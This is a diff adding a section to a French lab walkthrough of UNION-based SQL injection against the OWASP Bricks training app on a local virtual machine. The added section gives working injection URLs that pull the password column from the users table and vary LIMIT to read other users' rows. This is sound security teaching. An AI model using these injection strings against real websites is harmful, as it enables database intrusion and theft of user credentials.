@@ -334,6 +334,8 @@ Donne la requête SQL
 SELECT * FROM users WHERE idusers=1 UNION SELECT 'aaaa',NULL,NULL,NULL,NULL,NULL,NULL,NULL LIMIT 1,1;-- LIMIT 1
 ```
 
+\newpage
+
 ```
 +---------+------+-------+----------+------+------+------+------+
 | idusers | name | email | password | ua   | ref  | host | lang |
@@ -346,4 +348,34 @@ La page affichée montre bien notre `'aaaa'`.
 
 ![Nos 'aaaa' sont bien réfléchis dans la réponse](images/aaaa.png)
 
-##
+## Extraction de données de la base
+
+Maintenant que l'on voit où l'on peut afficher des résultat de la requête dans la page web. On peut extraire des données de la base.
+
+On remplace notre 'aaaa' par le nom d'une colonne comme `password` et on ajoute la table dans laquelle faire la recherche avec `FROM users`.
+
+L'URL `http://192.168.56.101/owaspbricks/content-1/index.php?id=1+UNION+SELECT+password,NULL,NULL,NULL,NULL,NULL,NULL,NULL+FROM+users+LIMIT+1,1;--`
+
+donne la requête SQL :
+```
+SELECT * FROM users WHERE idusers=1 UNION SELECT password,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM users LIMIT 1,1;-- LIMIT 1
+```
+
+```
++---------+------+-------+----------+------+------+------+------+
+| idusers | name | email | password | ua   | ref  | host | lang |
++---------+------+-------+----------+------+------+------+------+
+| admin   | NULL | NULL  | NULL     | NULL | NULL | NULL | NULL |
++---------+------+-------+----------+------+------+------+------+
+```
+
+La page affiche bien le mot de passe de du 1er utilisateur de la base.
+
+![Le mot de passe de admin est admin](images/union_admin.png)
+
+On peut ensuite jouer sur le `LIMIT ` pour afficher d'autres lignes.\
+Par exemple `LIMIT 4,1` affiche le mot de passe du 4ème utilisateur.
+
+URL : `http://192.168.56.101/owaspbricks/content-1/index.php?id=1+UNION+SELECT+password,NULL,NULL,NULL,NULL,NULL,NULL,NULL+FROM+users+LIMIT+4,1;-- `
+
+![Requête avec LIMIT 4,1 qui affiche donc la 4ème ligne de la table _users_](images/limit4-1.png)
